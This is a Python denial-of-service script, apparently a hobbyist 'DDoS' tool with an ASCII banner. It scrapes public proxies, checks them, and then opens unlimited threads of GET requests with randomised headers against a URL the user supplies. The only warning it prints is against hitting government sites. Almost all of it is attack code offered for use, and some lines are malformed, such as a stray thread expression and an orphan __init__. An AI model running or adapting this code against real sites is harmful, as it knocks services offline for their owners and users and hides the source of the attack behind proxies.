#!/usr/bin/python3
# -*- coding: utf-8  -*-
import requests as r, fake_headers
import os 
import threading
import random
import click
from threading import Thread
import requests
from colorama import Fore, Style, Back
from fake_headers import Headers
import time
import fade

os.system("clear")
print("\033[37mSHOULD NOT BE USED TO ATTACK GOVERNMENT SITES")
time.sleep(5)
print("\033[37mLoading.......")
time.sleep(5)

os.system("clear")
logo = """
╔══════════════════════════════════════════════════════════════╗
║╔════════════╗╔═════════════════════════════╗╔═══════════════╗║
║║            ║║                             ║║               ║║ 
║║          ▒▒▒▒▒▒▒           ▒▒▒           ▒▒▒▒▒             ║║
║║        ▒▒████═╗▒▒▒▒▒▒▒▒█████═╗▒▒▒▒▒▒▒▒▒▒▒█████═╗▒▒         ║║ 
║║       ▒▒█ ╔═══╝▒█═╗▒▒█═╗▒█ ╔═╝▒▒▒▒█████═╗█ ╔══█╚╗▒▒        ║║
║║       ▒▒█ ║▒█═╗▒█ ║▒▒█ ║▒█ ║█████═█ ╔═══╝█ ║  █ ║▒▒        ║║
║║       ▒▒█ ║▒█ ║▒█ ║▒▒█ ║▒█ ║▒▒█ ╔═███═╗▒▒█████ ╔╝▒▒        ║║ 
║║        ▒▒████ ║▒█ ║▒▒█ ║▒█ ║▒▒█ ║▒█ ╔═╝▒▒█ ╔══█═╗▒▒        ║║
║║        ▒▒╚══█ ║▒▒████ ╔╝▒╚═╝▒▒█ ║▒█████═╗╚═╝▒▒╚═╝▒▒        ║║ 
║║        ▒▒▒▒▒████═╚════╝▒▒▒▒▒▒▒█ ║▒╚═════╝▒▒▒▒▒▒▒           ║║ 
║║           ▒▒╚════╝▒▒▒▒▒▒    ▒▒╚═╝▒▒▒▒▒▒▒▒▒ ▒      ▒        ║║ 
║║            ▒▒▒▒▒▒▒            ▒▒▒▒  ▒           ▒          ║║ 
║║        ▒  ▒  ▒   ▒  ▒ ▒ ▒  ▒  ▒    ▒  ▒ ▒ ▒ ▒  ▒  ▒        ║║
║║	  ▒   ▒   ▒  ▒ ▒ ▒   ▒  ▒ ▒  ▒  ▒  ▒  ▒               ║║
║║                                                    ║║
║║                                                    ║║"""
faded_text = fade.fire(logo)
print(faded_text)
# Versi dan URL
def check_prox(array, url):
	ip = r.post("http://ip.beget.ru/").text
	for prox in array:
		thread_list = []
		t = threading.Thread (target=check, args=(ip, prox, url))
		thread_list.append(t)
		t.start()

while threading.active_count()>150 :
    time.sleep(5)
Thread:{threading.get_ident()}
def __init__(self):
        print("init")
	
def check(ip, prox, url):
	try:
		ipx = r.get("http://ip.beget.ru/", proxies={'http': "http://{}".format(prox), 'https':"http://{}".format(prox)}).text
	except:
		ipx = ip
	if ip != ipx:
		thread_list = []
		t = threading.Thread (target=ddos, args=(prox, url))
		thread_list.append(t)
		t.start()

def ddos(prox, url):
	proxies={"http":"http://{}".format(prox), "https":"http://{}".format(prox)}
	colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.MAGENTA, Fore.WHITE]
	color = random.choice(colors)
	while True:
		headers = Headers(headers=True).generate()
		thread_list = []
		t = threading.Thread (target=start_ddos, args=(prox, url, headers, proxies, color))
		thread_list.append(t)
		t.start()

def start_ddos(prox, url, headers, proxies, color):
	try:
		s = r.Session()
		req = s.get(url, headers=headers, proxies=proxies)
		if req.status_code == 200:
			print(color+ "disturb-proxy:  {}".format(prox))
			print("\033[104m\033[37m\033[3mServer gate :>\033[0m  \033[38;5;220m\033[3m"+str(url)+"\033[0m")
			
	except:
		pass

@click.command()
@click.option('--proxy', '-p', help="File with a proxy")
@click.option('--url', '-u', help="URL")
def main(proxy, url):
	if url == None:
		print("\033[38;5;220m┌[KunFayz————]😁🤣\033[0m")
		url = input("\033[38;5;220m└>••URL: \033[97m")
	if url[:4] != "http":
		print(Fore.RED+"Enter the full URL (example: http*://****.**/)"+Style.RESET_ALL)
		exit()
	if proxy == None:
		while True:
			req = r.get("https://api.proxyscrape.com/?request=displayproxies")
			array = req.text.split()
			print(Back.WHITE+Fore.BLACK+"•• ————> Found {} new proxies".format(len(array))+Style.RESET_ALL)
			print(f"\033[38;5;220m╔{'═' * 29}╗")
			print(f"\033[104m║{url}{' ' * 4}\033[0m║")
			print(f"\033[38;5;220m╚{'═' * 29}╝")
			check_prox(array, url)
	else:
		try:
			fx = open(proxy)
			array = fx.read().split()
			print("Found {} proxies in {}.\nChecking proxies...".format(len(array)), proxy)
			print("\033[104m\033[37m" +str(url)+ "\033[0m \033[34m")
			check_prox(array, url)
		except FileNotFoundError:
			print(Fore.RED+"File {} not found.".format(proxy)+Style.RESET_ALL)
			exit()

main()
